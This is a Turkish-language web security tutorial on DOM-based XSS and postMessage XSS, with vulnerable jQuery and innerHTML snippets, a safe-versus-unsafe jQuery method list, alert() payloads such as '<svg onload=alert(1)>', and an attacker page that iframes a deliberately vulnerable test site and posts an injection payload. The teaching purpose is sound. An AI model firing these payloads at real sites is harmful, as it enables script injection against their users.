# **0x09 | XSS Devam Part 2**

Xss, browserda yaşanan bir zafiyettir ve backend tarafıyla doğrudan bir alakası yoktur. Js, sayfadaki hareket kabiliyetlerini şekillendiren bir dildir. Xss zafiyeti 
ile de js'e yönelik payloadlar yazılır. Peki js kodlarının, user'ın kontrol edebildiği inputları kullanma durumu nasıl gerçekleşecek?

## **DOM XSS**

Burada user'ın kontrol edebildiği inputlar direkt developer'ın yazdığı kodun içindedir.

```
<html>
  <div id="msgArea">
  </div>
  <script>
    username = getUsername(); //API'den mevcut user'ın isminin getirilmesi
    var username = document.getElementById()

    $("#msgArea").html('Merhaba' + username);
  </script>
 </html>
```

Bir kullanıcı bir web uygulamasına kayıt olurken bir form doldurma yetkisine sahiptir. Girdiği kullanıcı adı veya şifre gibi bilgiler veri tabanına kaydedilir. Db'e kaydedildikten sonra uygulama, bilgileri kullanıcıya gösterecektir. Göstermek için de dom'u günceller. Yani kullanıcıdan gelen değişken dom'da değişikliğe sebep olur. 

Eğer username olarak <svg onload=alert(1)> yazarsak

```
<html>
  <div id="msgArea">
  </div>
  <script>
    username = getUsername(); //API'den mevcut user'ın isminin getirilmesi

    $("#msgArea").html('Merhaba' + username);

    document.getElementById('msgArea').innerHTML = 'Merhaba <svg onload=alert(1)>';
  </script>
 </html>
```

js id'si "msgArea" olan html tag'ına *<svg onload=alert(1)>* kodunu yerleştirir.

Girilen input uygulamada encode edimiş olsa bile başka bir yerde unescape edilip html'de kullanılabilir. Bu yüzden encode edilen kısımda xss açığı olmasa bile aynı input, uygulamanın başka yerlerinde açığa sebep olabilir. Bu nedenle dom'un nerede güncellendiği önemli bir husustur. 

```
username = "mehmet%3c"
$("msgArea").html('Merhaba '+ unescape(username));
```

Uygulamadaki tüm kodları baştan aşağı incelemektense aşağıdaki gibi dom update'in gerçekleşmesini sağlayan jquery fonksiyonlarını incelemek mantıklı olacaktır.

```
Safe
.text()
.attr() // still needs to be careful when used in an href
.prop()
.val()
Unsafe
$("html code")
.html()
.append*()
.insert*()
.prepend*()
.wrap*()
.before()
.after()

https://coderwall.com/p/h5lqla/safe-vs-unsafe-jquery-methods
```

## **Post Message**

Bu kodda görüldüğü üzere bir eventlistener var. Eventlistener'ın yaptığı şey ise mesaj geldiğinde postMessageHandler isimli fonksiyona göndermek. Fonksiyon, gelen mesajın bir json olmasını bekliyor. Json parse edildiğinde oluşan content'i alınıp bir div oluşturuluyor. Bu div'in içine gelen mesajı innerhtml ile yerleştiriyor, oluşan divi sayfaya ekliyor ve bu sayfada bir xss var. 

```
<html>
  <head><title>Toxic DOM</title></head>
  <body>
    <script>
      var postMessageHandler = function(msg) {
  var content = JSON.parse(msg.data);
  var div = document.createElement('div');
  div.innerHTML = content.html;
  document.documentElement.appendChild(div);
};

window.addEventListener('message', postMessageHandler, false);

    </script>
  </body>
</html>
```

### **Peki bu xss nasıl oluşuyor?**

"hacker.com" isminde bir web sitesi düşünelim. Bu websitesi browser tarafından çağrılıyor. hacker.com'da bir iframe açılacak. Açılan iframe'de ise "https://public-firing-range.appspot.com/dom/toxicdom/postMessage/innerHtml" url'i olacak. Bu url, xss zafiyeti barındıran bir sitenin. Iframe ile açmamızın sebebi ise bu web sitesinin içeriğinde kendisini iframe ile açan kişinin gönderdiği mesajları dinleyen ve buna göre aksiyon alan bir JavaScript kodunun olmasıdır. hacker.com’da browser tarafından iframe ile açtığımız bağlantıya bir json verisi gönderilecek ve alınan bu json parse edildikten sonra ‘content’ elde edilecektir. Daha sonra bu content içeriği innerHTML ile direkt olarak div içerisine yazdırılır. Burada innerHTML kullanımı tehlikelidir.

Innerhtml'in tehlikeli olma sebebi aşağıdaki koddan da anlaşılabilir. Innerhtml *<svg onload=alert(1)>* payload'ını domun içine ekliyor. 

```
<html>
  <script>
      var div = document.createElement("div");
      div.innerHTML = "<svg onload=alert(1)>";
      document.documentElement.appendChild(div);
  </script>
  <body>
    <div id="test"></div>
  </body>
</html>
```

Aşağıdaki kaynak kodlara sahip hacker.com web sitesinde, iframe ile bu sayfa açıldığını varsayarsak. Sayfa açıldığında bizi xss barındıran siteye götürecektir. Ama bu, daha dinamik bir şekilde de yapılabilir. 

```
<html>
  <body>
    <iframe
      src="https://public-firing-range.appspot.com
       /dom/toxicdom/postMessage/innerHtml">

    </iframe>
  </body>
</html>
```

Bu web sitesi, kendisini iframe ile açan bir sayfadan mesaj alan ve bu mesajdaki veri ile veriyi parse ettikten sonra bir div oluşturuyordu. div'in içeriğine kullanıcıdan aldığı mesajı yazıyor. Sitenin yaptığı işlemler özetle bu şekildeydi. Aşağıdaki kodlarda, JavaScript ile bir EventListener eklenmiş durumda, buradaki EventListener kendisine bir mesaj geldiğinde bu mesajı alır ve postMessageHandler isimli fonksiyona gönderir. Bu sayfayı iframe ile açan başka bir web sitesinin bu web sitesine gönderdiği event mesajını alan fonksiyon bu içeriğin json olmasını beklemektedir. Aldığı bu json’ı parse ettiğinde oluşan içeriği alıp yeni oluşturduğu div’in içerisine HTML şeklinde yerleştirir. Daha sonra da oluşan bu div’i sayfaya eklemektedir. Burada da XSS meydana gelir. 

```
<html>
    <iframe id = "target" src = ""> </iframe>
  <script>
    var target = document.getElementById('target');
    target.addEventListener('load',function(){
      var payload = {'html':'x'};
      target.contentWindow.postMessage(JSON.stringify(payload),'*');
});
      target.src = "https://public-firing-range.appspot.com/dom/toxicdom/postMessage/innerHtml"
  </script>
</html>
```

Kodun, sitede pop-up çıkartacak hâli aşağıdadır.

```
<html>
    <iframe id = "target" src = ""> </iframe>
  <script>
    var target = document.getElementById('target');
    target.addEventListener('load',function(){
      var payload = {'html':'<img src=x onerror=alert(1)>'};
      target.contentWindow.postMessage(JSON.stringify(payload),'*');
});
      target.src = "https://public-firing-range.appspot.com/dom/toxicdom/postMessage/innerHtml"
  </script>
</html>
```
